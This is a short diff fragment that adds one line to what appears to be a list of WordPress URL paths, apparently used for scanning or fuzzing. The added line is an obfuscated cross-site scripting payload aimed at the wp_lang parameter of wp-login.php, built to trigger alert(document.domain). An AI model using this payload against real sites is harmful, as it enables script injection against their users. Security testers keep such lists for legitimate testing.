@@ -95,3 +95,4 @@
 /wp-content/plugins/wpify-woo/deps/dragonbe/vies/examples/async_processing/queue.php/
 /
 /wp-json/wp/v2/pages?per_page=100
+/wp-login.php?wp_lang=%20=id=x+type=image%20id=xss%20onfoc<!>usin+alert(`document.domain`)%0c
